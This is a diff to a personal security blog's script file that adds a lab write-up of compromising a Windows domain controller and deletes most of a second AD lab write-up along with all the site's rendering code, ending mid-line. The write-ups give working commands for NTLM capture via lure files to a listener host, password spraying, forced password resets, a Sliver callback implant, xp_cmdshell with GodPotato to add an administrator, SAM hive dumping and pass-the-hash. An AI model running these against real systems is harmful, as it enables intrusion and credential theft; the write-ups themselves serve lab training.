@@ -311,6 +311,137 @@ const PROJECTS = [
                 author, summary, tags[], link ({title,url} or null), body (HTML) } */
 const WRITEUPS = [
   {
+    id: "sharethepain",
+    title: "ShareThePain: Writable Share to Domain Controller",
+    date: "2026-04-11",
+    platform: "Hack Smarter Labs",
+    difficulty: "Medium",
+    author: "0xz3r0",
+    summary: "Anonymous write on an SMB share, an NTLMv2 capture, a BloodHound-driven password reset, a loopback-bound SQL instance pivoted with Sliver, and SeImpersonatePrivilege escalated through GodPotato to SYSTEM on DC01.",
+    tags: ["SMB", "NTLM", "BloodHound", "Evil-WinRM", "MSSQL", "xp_cmdshell", "SeImpersonatePrivilege"],
+    link: { title: "Hack Smarter Labs: ShareThePain", url: "https://www.hacksmarter.org/" },
+    body: `
+      <h2>Overview</h2>
+      <p>ShareThePain is a Hack Smarter Labs machine on the <code>hack.smarter</code> domain. No credentials at the start. The path runs from an anonymously writable SMB share to an NTLMv2 capture, a password reset driven by a BloodHound edge, an MSSQL instance bound to localhost, and SeImpersonatePrivilege abused for SYSTEM on DC01.</p>
+
+      <h2>Scope and reconnaissance</h2>
+      <p>Direct network access, zero credentials. RustScan feeds Nmap for service and version detection, and the target resolves to a Windows Server 2022 domain controller, DC01, on <code>hack.smarter</code>:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">rustscan -a &lt;TARGET_IP&gt; -- -A</code></pre>
+      </div>
+      <p>DNS, Kerberos, LDAP, SMB, RPC, WinRM (5985) and RDP answer. The RDP certificate names <code>DC01.hack.smarter</code>, which sets the domain and confirms a single DC is the whole scope.</p>
+
+      <h2>SMB: anonymous listing and a writable share</h2>
+      <p>Anonymous listing works, and the default shares sit alongside a non-default share called <code>Share</code>:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">smbclient -L //hack.smarter</code></pre>
+      </div>
+      <p>NetExec confirms the guest/null context and shows <code>Share</code> as READ,WRITE. A writable share with anonymous access is the foothold: drop a lure file, catch the authentication it produces.</p>
+      <figure>
+        <img src="images/sharethepain-writable-share.png" alt="NetExec share listing showing the writable Share share">
+        <figcaption>Figure 1: NetExec share enumeration as anonymous. <code>Share</code> is READ,WRITE.</figcaption>
+      </figure>
+
+      <h2>Capturing an NTLMv2 hash with SMBKiller</h2>
+      <p>SMBKiller builds the lure, uploads it, and runs the listener. <code>-r</code> is the target, <code>-l</code> the listener, <code>-a</code> the share name:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">python3 SMBKiller.py -r &lt;TARGET_IP&gt; -l &lt;LISTENER_IP&gt; -d hack.smarter -i tun0 -a Share -U '' -P '' -A</code></pre>
+      </div>
+      <p>The listener catches an NTLMv2 response for <code>HACK\\bob.ross</code>.</p>
+      <figure>
+        <img src="images/sharethepain-ntlm-capture.png" alt="SMBKiller capturing the NTLMv2 response for bob.ross">
+        <figcaption>Figure 2: Captured NTLMv2 response for <code>HACK\\bob.ross</code> (hash redacted).</figcaption>
+      </figure>
+      <p>Crack offline. Rockyou gets it quickly:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+      </div>
+
+      <h2>Validating bob.ross</h2>
+      <p>Validate, then re-enumerate the shares with a real session:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc smb hack.smarter -u 'bob.ross' -p '&lt;PASSWORD&gt;' --shares</code></pre>
+      </div>
+      <p><code>bob.ross</code> reads <code>NETLOGON</code>, <code>SYSVOL</code> and <code>IPC$</code>, and keeps READ,WRITE on <code>Share</code>. Nothing useful on the share itself, so the next move is to see what else the account can reach.</p>
+      <p>Pull the domain user list over LDAP and spray the recovered password. Only <code>bob.ross</code> accepts it, so no lateral gain here, but the user list is now available for the next phase:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc ldap hack.smarter -u 'bob.ross' -p '&lt;PASSWORD&gt;' --users-export users.txt
+nxc smb hack.smarter -u users.txt -p '&lt;PASSWORD&gt;' --continue-on-success</code></pre>
+      </div>
+
+      <h2>BloodHound: bob.ross has GenericAll over alice.wonderland</h2>
+      <p>Collect the domain with bloodhound-python and ingest. The path is immediate: <code>bob.ross</code> holds <code>GenericAll</code> over <code>ALICE.WONDERLAND</code>, with <code>WriteOwner</code> and <code>Owns</code> alongside. Full control means a password reset without knowing the current one. Alice is in Remote Management Users, so the reset turns into a WinRM shell.</p>
+      <figure>
+        <img src="images/sharethepain-bloodhound.png" alt="BloodHound graph showing bob.ross GenericAll over alice.wonderland">
+        <figcaption>Figure 3: BloodHound edges from <code>bob.ross</code> to <code>ALICE.WONDERLAND</code>.</figcaption>
+      </figure>
+
+      <h2>Resetting alice.wonderland</h2>
+      <p>Reset the password over RPC:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">net rpc password "ALICE.WONDERLAND" "&lt;NEW_PASSWORD&gt;" -U "hack.smarter"/"bob.ross"%'&lt;PASSWORD&gt;' -S "DC01.hack.smarter"</code></pre>
+      </div>
+      <p>Confirm the reset by authenticating as Alice, then take WinRM:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc smb hack.smarter -u "ALICE.WONDERLAND" -p "&lt;NEW_PASSWORD&gt;" --shares
+evil-winrm -i hack.smarter -u "alice.wonderland" -p "&lt;NEW_PASSWORD&gt;"</code></pre>
+      </div>
+      <figure>
+        <img src="images/sharethepain-evil-winrm.png" alt="Evil-WinRM session as alice.wonderland reading the user flag">
+        <figcaption>Figure 4: Evil-WinRM session as <code>alice.wonderland</code>. User flag on the desktop (redacted).</figcaption>
+      </figure>
+      <p>Alice's token is thin (SeMachineAccountPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege), so this is not the endpoint. The next move is to look at what the host listens on that the external scan never saw.</p>
+
+      <h2>Foothold enumeration: MSSQL bound to loopback</h2>
+      <p><code>netstat -ano | findstr LISTENING</code> shows the usual DC services plus one that was not in the external scan: SQL Server on <code>127.0.0.1:1433</code>. Bound to loopback, so it is only reachable from the host. A pivot target, not a direct one.</p>
+      <p>Read the user flag on the way through, then set up the pivot:</p>
+      <div class="code-wrap">
+        <pre><code class="language-powershell">type C:\\Users\\alice.wonderland\\Desktop\\user.txt</code></pre>
+      </div>
+
+      <h2>Pivoting to MSSQL with Sliver</h2>
+      <p>MSSQL is on loopback, so traffic has to leave the DC through a tunnel that terminates on Kali. Sliver provides the pivot. Generate an mTLS implant, transfer it to the DC through the WinRM session, and start it:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">sliver &gt; generate --mtls &lt;LISTENER_IP&gt; --port 443 --os windows --save /path/to/pivot.exe</code></pre>
+      </div>
+      <p>With the implant running and a SOCKS proxy up through it, connect to the loopback-bound SQL instance with Impacket and Alice's Windows authentication:</p>
+      <figure>
+        <img src="images/sharethepain-mssql-connect.png" alt="Impacket mssqlclient connecting to SQL Server through the Sliver pivot">
+        <figcaption>Figure 5: <code>mssqlclient.py</code> against <code>127.0.0.1</code> through the Sliver SOCKS proxy, authenticated as <code>HACK\\alice.wonderland</code>.</figcaption>
+      </figure>
+      <div class="code-wrap">
+        <pre><code class="language-bash">proxychains -q impacket-mssqlclient 'hack.smarter'/'alice.wonderland':'&lt;NEW_PASSWORD&gt;'@127.0.0.1 -windows-auth</code></pre>
+      </div>
+      <p>Connection returns <code>Microsoft SQL Server 2019 RTM (15.0.2000)</code>, context <code>HACK\\alice.wonderland dbo@master</code>. Alice is <code>dbo</code> on the instance, which is the whole game.</p>
+
+      <h2>Command execution via xp_cmdshell</h2>
+      <p><code>xp_cmdshell</code> is available to this login. Confirm the execution context and the token privileges:</p>
+      <div class="code-wrap">
+        <pre><code class="language-sql">xp_cmdshell whoami
+xp_cmdshell whoami /priv</code></pre>
+      </div>
+      <p>Execution lands as <code>nt service\\mssql$sqlexpress</code>. The privilege list is the important part: <code>SeImpersonatePrivilege</code> is Enabled.</p>
+      <figure>
+        <img src="images/sharethepain-xp-cmdshell.png" alt="xp_cmdshell output showing SeImpersonatePrivilege enabled">
+        <figcaption>Figure 6: <code>xp_cmdshell whoami /priv</code> as the SQL Server service account, with <code>SeImpersonatePrivilege</code> enabled.</figcaption>
+      </figure>
+
+      <h2>Escalating with SeImpersonatePrivilege</h2>
+      <p>SeImpersonate on a service account leads to the same DCOM/RPCSS impersonation chain the potatoes exploit. GodPotato is the current tool for it. Stage it in a writable directory and add a local administrator from the SQL session:</p>
+      <div class="code-wrap">
+        <pre><code class="language-sql">EXEC xp_cmdshell 'C:\\Users\\Public\\w.exe -cmd "cmd /c net user &lt;USER&gt; &lt;PASSWORD&gt; /add"';
+EXEC xp_cmdshell 'C:\\Users\\Public\\w.exe -cmd "net localgroup administrators &lt;USER&gt; /add"';</code></pre>
+      </div>
+      <p>GodPotato triggers RPCSS, impersonates the SYSTEM token, and launches the command as <code>NT AUTHORITY\\SYSTEM</code>. With a local administrator in place, authenticate over WinRM and read the final flag:</p>
+      <div class="code-wrap">
+        <pre><code class="language-powershell">type C:\\Users\\Administrator\\Desktop\\root.txt</code></pre>
+      </div>
+
+      <h2>Wrap-up</h2>
+      <p>Anonymous write on SMB, one cracked NTLMv2 response, one BloodHound edge, one loopback-bound SQL instance, and one service account with SeImpersonate. Full domain compromise without writing exploit code.</p>
+    `
+  },
+  {
     id: "building-magic-ad",
     title: "Building Magic: Active Directory Compromise",
     date: "2026-06-06",
@@ -344,424 +475,4 @@ const WRITEUPS = [
         <li>A Python Werkzeug web app on port 8080, titled "Building Magic Application Portal"</li>
       </ul>
 
-      <h2>Initial access: validating leaked credentials</h2>
-      <p>The leaked database uses unsalted hashes, which lookup services such as CrackStation resolve immediately. Two entries cracked:</p>
-      <table>
-        <thead><tr><th>Username</th><th>Name</th><th>Role</th><th>Password</th></tr></thead>
-        <tbody>
-          <tr><td><code>r.widdleton</code></td><td>Ron Widdleton</td><td>Intern Builder</td><td>lilronron</td></tr>
-          <tr><td><code>t.ren</code></td><td>Theodore Ren</td><td>Safety Officer</td><td>shadowhex7</td></tr>
-        </tbody>
-      </table>
-      <p>Validate both credential sets with NetExec. <code>t.ren</code> returned <code>STATUS_LOGON_FAILURE</code>, so the chain proceeds with <code>r.widdleton</code>:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">nxc smb dc01.buildingmagic.local -u r.widdleton -p lilronron --shares</code></pre>
-      </div>
-      <p>Authentication succeeds and enumerates the shares, including <code>File-Share</code>, the company's central file repository.</p>
-      <figure>
-        <img src="images/nxc-shares.png" alt="NetExec output confirming r.widdleton and listing the shares">
-        <figcaption>Figure 1: NetExec output confirming r.widdleton and listing the shares.</figcaption>
-      </figure>
-
-      <h2>Domain mapping with BloodHound</h2>
-      <p>Collect domain data for BloodHound with the valid account:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --bloodhound -ns dc01.buildingmagic.local --collection All</code></pre>
-      </div>
-      <figure>
-        <img src="images/bloodhound-graph.png" alt="BloodHound graph of the collected data">
-        <figcaption>Figure 2: BloodHound graph of the collected data.</figcaption>
-      </figure>
-
-      <h2>Kerberoasting: recovering r.haggard's password</h2>
-      <p>Any authenticated domain user can request service tickets for SPN-bearing accounts. The LDAP query identified <code>r.haggard</code> as a candidate, so request its TGS hash:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --kerberoast output.txt</code></pre>
-      </div>
-      <p>The password has not rotated since May 2025. Crack the offline TGS-REP hash with Hashcat mode 13100 (etype 23):</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt</code></pre>
-      </div>
-      <p>The hash cracks to <code>rubeushagrid</code>, giving control of <code>r.haggard</code>.</p>
-
-      <h2>Lateral movement: remote password reset</h2>
-      <p>With <code>r.haggard</code>'s credentials, a remote password reset is possible via <code>net rpc password</code>:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"</code></pre>
-      </div>
-      <p>This yields access to <code>h.potch</code>, which carries the password <code>12345</code>.</p>
-
-      <h2>NTLM theft via a malicious LNK file</h2>
-      <p><code>h.potch</code> has write access to <code>File-Share</code>. The NetExec slinky module plants a shortcut referencing the attacker's host; when a user browses the share, Windows authenticates to the listener and leaks the NTLM challenge response:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">nxc smb dc01.buildingmagic.local -u h.potch -p 12345 -M slinky -o NAME=important SERVER=&lt;attacker_IP&gt; SHARE=File-Share</code></pre>
-      </div>
-      <p>Run Responder to capture the callback. The NetNTLMv2 response belongs to <code>h.grangon</code>; cracking it offline with Hashcat mode 5600 yields <code>magic4ever</code>.</p>
-
-      <h2>Access as h.grangon and SeBackupPrivilege abuse</h2>
-      <p>Authenticate over WinRM with the recovered credentials:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">evil-winrm -i dc01.buildingmagic.local -u h.grangon -p magic4ever</code></pre>
-      </div>
-      <p><code>whoami /priv</code> confirms SeBackupPrivilege on <code>h.grangon</code>. This permits reading any file irrespective of ACLs, so the registry hives containing local account hashes can be exported:</p>
-      <div class="code-wrap">
-        <pre><code class="language-powershell">reg save hklm\\sam C:\\Users\\h.grangon\\Desktop\\sam
-reg save hklm\\system C:\\Users\\h.grangon\\Desktop\\system</code></pre>
-      </div>
-      <p>Exfiltrate both hives with Evil-WinRM's <code>download</code> command and extract the local hashes offline.</p>
-      <figure>
-        <img src="images/whoami-priv.png" alt="whoami /priv output showing SeBackupPrivilege">
-        <figcaption>Figure 3: whoami /priv output showing SeBackupPrivilege.</figcaption>
-      </figure>
-
-      <h2>Pass-the-hash: access as a.flatch</h2>
-      <p>The <code>a.flatch</code> NT hash is reused, allowing authentication without the plaintext password:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">evil-winrm -u 'a.flatch' -H '520126a03f5d5a8d836f1c4f34ede7ce' -i dc01.buildingmagic.local</code></pre>
-      </div>
-      <h2>Extracting local hashes from the SAM and SYSTEM hives</h2>
-      <p>From the <code>h.grangon</code> session, <code>SeBackupPrivilege</code> lets us read the SAM and SYSTEM hives regardless of their ACLs. Confirm the privilege first:</p>
-      <div class="code-wrap">
-        <pre><code class="language-powershell">whoami /priv</code></pre>
-      </div>
-      <p>Export both hives, then download them with Evil-WinRM. The SYSTEM hive can take a while to transfer.</p>
-      <div class="code-wrap">
-        <pre><code class="language-powershell">reg save HKLM\\SAM "C:\\Users\\h.grangon\\Documents\\SAM"
-reg save HKLM\\SYSTEM "C:\\Users\\h.grangon\\Documents\\SYSTEM"</code></pre>
-      </div>
-      <p>Extract the local account hashes offline with Impacket's <code>secretsdump</code>:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">secretsdump.py -sam './SAM' -system './SYSTEM' LOCAL</code></pre>
-      </div>
-      <p>The recovered local Administrator NT hash fails with <code>wmiexec.py</code>, <code>psexec.py</code> and Evil-WinRM. Rather than stop there, test it against every account from the RID brute-force list:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">nxc smb BUILDINGMAGIC.LOCAL -u users.txt -H &lt;NT_hash&gt; --continue-on-success</code></pre>
-      </div>
-      <p><code>a.flatch</code> accepts the hash and also has Administrator rights.</p>
-
-      <h2>Administrator access on DC01</h2>
-      <p>Authenticate as <code>a.flatch</code> with the hash and read the final flag from the Administrator desktop:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">evil-winrm -i dc01.buildingmagic.local -u a.flatch -H &lt;NT_hash&gt;</code></pre>
-      </div>
-      <p>The root flag is located at <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p>
-
-    `
-  },
-];
-
-/* Blog posts: { id, title, date, author, summary, tags[], body (HTML) } */
-const POSTS = [
-];
-
-/* About page HTML */
-const ABOUT_HTML = `
-  <h1>About</h1>
-  <p class="lead">Add a short introduction here.</p>
-`;
-
-/* Contact links: { label, url } */
-const CONTACT_LINKS = [
-  { label: "LinkedIn", url: "https://www.linkedin.com/in/damianpolomski" },
-];
-
-/* ============================================================
-   RENDERING (no code below needs editing)
-   ============================================================ */
-
-const $ = (sel) => document.querySelector(sel);
-
-function esc(str) {
-  return String(str ?? "").replace(/[&<>"']/g, c => ({
-    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
-  }[c]));
-}
-const yearOf = (item) => String(item.date).slice(0, 4);
-const tagsHTML = (tags = []) => `<div class="tags">${tags.map(t => `<span class="tag">${esc(t)}</span>`).join("")}</div>`;
-const emptyMsg = (msg) => `<p class="empty">${msg}</p>`;
-
-/* ---------- Router state ---------- */
-let projectFilter = "all";
-let searchQuery = "";
-
-function parseRoute() {
-  const hash = location.hash.replace(/^#/, "");
-  const [a, b] = hash.split("/");
-  if (a === "writeup") { const item = WRITEUPS.find(w => w.id === b); if (item) return { view: "writeup", item }; }
-  if (a === "post")    { const item = POSTS.find(p => p.id === b);    if (item) return { view: "post", item }; }
-  if (["projects", "blog", "about", "contact"].includes(a)) return { view: a };
-  return { view: "home" };
-}
-
-/* ---------- Top nav ---------- */
-function renderTopNav(route) {
-  const links = [["projects", "Projects"], ["blog", "Blog"], ["about", "About"], ["contact", "Contact"]];
-  $("#top-nav").innerHTML = links.map(([k, l]) =>
-    `<a href="#${k}" class="${route.view === k ? "active" : ""}">${l}</a>`).join("");
-}
-
-/* ---------- Sidebar ---------- */
-function renderSidebar(route) {
-  const q = searchQuery.trim().toLowerCase();
-  const match = (t) => !q || String(t).toLowerCase().includes(q);
-
-  const groups = {};
-  WRITEUPS.filter(w => match(w.title) || match(w.platform)).forEach(w => {
-    (groups[w.platform] ||= {});
-    (groups[w.platform][yearOf(w)] ||= []).push(w);
-  });
-
-  const writeupBlocks = Object.entries(groups).map(([platform, years]) => `
-    <div class="side-section">
-      <div class="side-label">${esc(platform)}</div>
-      ${Object.entries(years).map(([yr, items]) => `
-        <div class="side-year">${esc(yr)}</div>
-        <div class="side-children">
-          ${items.map(w => `<a class="side-link ${route.view === "writeup" && route.item.id === w.id ? "active" : ""}"
-             href="#writeup/${esc(w.id)}">${esc(w.title)}</a>`).join("")}
-        </div>`).join("")}
-    </div>`).join("");
-
-  const postLinks = POSTS.filter(p => match(p.title)).map(p => `
-    <a class="side-link ${route.view === "post" && route.item.id === p.id ? "active" : ""}"
-       href="#post/${esc(p.id)}">${esc(p.title)}</a>`).join("");
-
-  const noResults = q && !writeupBlocks && !postLinks
-    ? `<p class="no-results">No matches for "${esc(searchQuery)}".</p>` : "";
-
-  $("#side").innerHTML = `
-    <div class="side-section">
-      <a class="side-link ${route.view === "home" ? "active" : ""}" href="#home">Home</a>
-      <a class="side-link ${route.view === "projects" ? "active" : ""}" href="#projects">Projects</a>
-    </div>
-    ${writeupBlocks}
-    ${postLinks ? `<div class="side-section"><div class="side-label">Blog</div>${postLinks}</div>` : ""}
-    ${noResults}
-  `;
-}
-
-/* ---------- Views ---------- */
-function projectCard(p) {
-  return `
-    <div class="card">
-      <div class="kicker">${esc(p.date)} · ${esc(p.category)}</div>
-      <h3>${esc(p.title)}</h3>
-      <p>${esc(p.summary)}</p>
-      ${tagsHTML(p.tags)}
-      ${p.repo ? `<a class="more" href="${esc(p.repo)}">Source →</a>` : ""}
-    </div>`;
-}
-
-function viewHome() {
-  const writeups = WRITEUPS.length
-    ? `<div class="cards">${WRITEUPS.map(w => `
-        <div class="card">
-          <div class="kicker">${esc(w.platform)} · ${esc(w.difficulty)} · ${esc(w.date)}</div>
-          <h3><a href="#writeup/${esc(w.id)}">${esc(w.title)}</a></h3>
-          <p>${esc(w.summary)}</p>
-          <a class="more" href="#writeup/${esc(w.id)}">Read →</a>
-        </div>`).join("")}</div>`
-    : emptyMsg("No write-ups yet.");
-
-  const projects = PROJECTS.length
-    ? `<div class="cards">${PROJECTS.slice(0, 3).map(projectCard).join("")}</div>`
-    : emptyMsg("No projects yet.");
-
-  return `
-    <h1>Writeups</h1>
-    <p class="lead">Projects, CTF and lab write-ups, and notes on breaking things so they stay fixed. Pick a write-up from the sidebar.</p>
-    <h2>Latest write-ups</h2>
-    ${writeups}
-    <h2>Recent projects</h2>
-    ${projects}
-  `;
-}
-
-function viewProjects() {
-  const cats = ["all", ...new Set(PROJECTS.map(p => p.category))];
-  const list = PROJECTS.filter(p => projectFilter === "all" || p.category === projectFilter);
-  const body = list.length
-    ? `<div class="cards">${list.map(projectCard).join("")}</div>`
-    : emptyMsg(PROJECTS.length ? "No projects in this category yet." : "No projects yet.");
-  return `
-    <h1>Projects</h1>
-    <p class="lead">Tools, labs and experiments.</p>
-    <div class="filters">
-      ${cats.map(c => `<button class="filter-btn ${c === projectFilter ? "on" : ""}" data-cat="${esc(c)}">${esc(c)}</button>`).join("")}
-    </div>
-    ${body}
-  `;
-}
-
-function viewBlog() {
-  const body = POSTS.length
-    ? `<div class="cards">${POSTS.map(p => `
-        <div class="card">
-          <div class="kicker">${esc(p.date)}</div>
-          <h3><a href="#post/${esc(p.id)}">${esc(p.title)}</a></h3>
-          <p>${esc(p.summary)}</p>
-          <a class="more" href="#post/${esc(p.id)}">Read →</a>
-        </div>`).join("")}</div>`
-    : emptyMsg("No posts yet.");
-  return `
-    <h1>Blog</h1>
-    <p class="lead">Longer posts on techniques, research and lessons learned.</p>
-    ${body}
-  `;
-}
-
-function viewContact() {
-  const links = CONTACT_LINKS.length
-    ? `<div class="about-links">${CONTACT_LINKS.map(l => `<a href="${esc(l.url)}">${esc(l.label)}</a>`).join("")}</div>`
-    : emptyMsg("No contact links yet.");
-  return `
-    <h1>Contact</h1>
-    <p class="lead">Add your preferred links below, or an email address you're happy to share publicly.</p>
-    ${links}
-  `;
-}
-
-function viewArticle(kind, item) {
-  const isWriteup = kind === "writeup";
-  const crumb = isWriteup
-    ? `${esc(item.platform)} / ${esc(item.date)}`
-    : `Blog / ${esc(item.date)}`;
-
-  const linkCard = isWriteup && item.link ? `
-    <a class="link-card" href="${esc(item.link.url)}">
-      <div>
-        <div class="lc-title">${esc(item.link.title)}</div>
-        <div class="lc-url">${esc(item.link.url.replace(/^https?:\/\//, "").replace(/\/$/, ""))}</div>
-      </div>
-      <span class="chev">›</span>
-    </a>` : "";
-
-  const subtitle = isWriteup ? `${esc(item.difficulty)} · by ${esc(item.author)}` : `by ${esc(item.author)}`;
-
-  const summaryBlock = !isWriteup
-    ? `<details class="summary-box" open><summary>Summary</summary><div>${esc(item.summary)}</div></details>`
-    : "";
-
-  return `
-    <div class="article-top">
-      <div class="crumbs"><a href="#${isWriteup ? "home" : "blog"}">${isWriteup ? "Writeups" : "Blog"}</a> &nbsp;›&nbsp; ${crumb}</div>
-      <div class="page-actions"><button class="btn-copy" id="copy-link">Copy link</button></div>
-    </div>
-    <h1>${esc(item.title)}</h1>
-    <p class="subtitle">${subtitle}</p>
-    ${tagsHTML(item.tags)}
-    ${linkCard}
-    ${summaryBlock}
-    <div class="article-body">${item.body}</div>
-    <div class="article-footer">
-      <span style="color:var(--muted)">Last updated ${esc(item.date)}</span>
-      <a href="#${isWriteup ? "home" : "blog"}">← Back</a>
-    </div>
-  `;
-}
-
-/* ---------- Enhancements ---------- */
-function addCopyButtons(root) {
-  root.querySelectorAll("pre").forEach(pre => {
-    if (pre.querySelector(".copy-btn")) return;
-    const btn = document.createElement("button");
-    btn.className = "copy-btn";
-    btn.textContent = "Copy";
-    btn.addEventListener("click", async () => {
-      try { await navigator.clipboard.writeText(pre.innerText); btn.textContent = "Copied"; }
-      catch (_) { btn.textContent = "Failed"; }
-      setTimeout(() => (btn.textContent = "Copy"), 1500);
-    });
-    pre.appendChild(btn);
-  });
-}
-
-function wireCopyLink() {
-  const b = document.getElementById("copy-link");
-  if (!b) return;
-  b.addEventListener("click", async () => {
-    try { await navigator.clipboard.writeText(location.href); b.textContent = "Copied"; }
-    catch (_) { b.textContent = "Failed"; }
-    setTimeout(() => (b.textContent = "Copy link"), 1500);
-  });
-}
-
-function buildToc(root) {
-  const tocEl = $("#toc");
-  const heads = root.querySelectorAll(".article-body h2, .article-body h3");
-  if (!heads.length) { tocEl.innerHTML = ""; return; }
-  heads.forEach((h, i) => { if (!h.id) h.id = "sec-" + i; });
-  tocEl.innerHTML = `<div class="toc-title">On this page</div>` +
-    Array.from(heads).map(h =>
-      `<a class="${h.tagName.toLowerCase()}" data-target="${h.id}" href="#${h.id}">${esc(h.textContent)}</a>`
-    ).join("");
-}
-
-function highlightToc() {
-  const links = document.querySelectorAll("#toc a");
-  if (!links.length) return;
-  let current = null;
-  links.forEach(a => {
-    const el = document.getElementById(a.dataset.target);
-    if (el && el.getBoundingClientRect().top <= 120) current = a.dataset.target;
-  });
-  links.forEach(a => a.classList.toggle("current", a.dataset.target === current));
-}
-
-/* ---------- Render ---------- */
-function render() {
-  const route = parseRoute();
-  renderTopNav(route);
-  renderSidebar(route);
-
-  const main = $("#main");
-  let html;
-  switch (route.view) {
-    case "writeup": html = viewArticle("writeup", route.item); break;
-    case "post":    html = viewArticle("post", route.item); break;
-    case "projects": html = viewProjects(); break;
-    case "blog":    html = viewBlog(); break;
-    case "about":   html = ABOUT_HTML; break;
-    case "contact": html = viewContact(); break;
-    default:        html = viewHome();
-  }
-  main.innerHTML = html;
-
-  if (route.view === "writeup" || route.view === "post") {
-    buildToc(main);
-    wireCopyLink();
-  } else {
-    $("#toc").innerHTML = "";
-  }
-  addCopyButtons(main);
-  window.scrollTo({ top: 0 });
-  $("#side").classList.remove("open");
-}
-
-/* ---------- Events ---------- */
-document.addEventListener("click", e => {
-  const filter = e.target.closest("[data-cat]");
-  if (filter) { projectFilter = filter.dataset.cat; render(); }
-});
-
-$("#search").addEventListener("input", e => {
-  searchQuery = e.target.value;
-  renderSidebar(parseRoute());
-});
-
-$("#menu-btn").addEventListener("click", () => $("#side").classList.toggle("open"));
-
-$("#toc").addEventListener("click", e => {
-  const a = e.target.closest("a[data-target]");
-  if (!a) return;
-  e.preventDefault();
-  const el = document.getElementById(a.dataset.target);
-  if (el) el.scrollIntoView({ behavior: "smooth", block: "start" });
-});
-window.addEventListener("hashchange", render);
-window.addEventListener("scroll", highlightToc, { passive: true });
-
-render();
-</script>
-</body>
-</html>
+      <h2>Initial access: validating leaked credentials</h
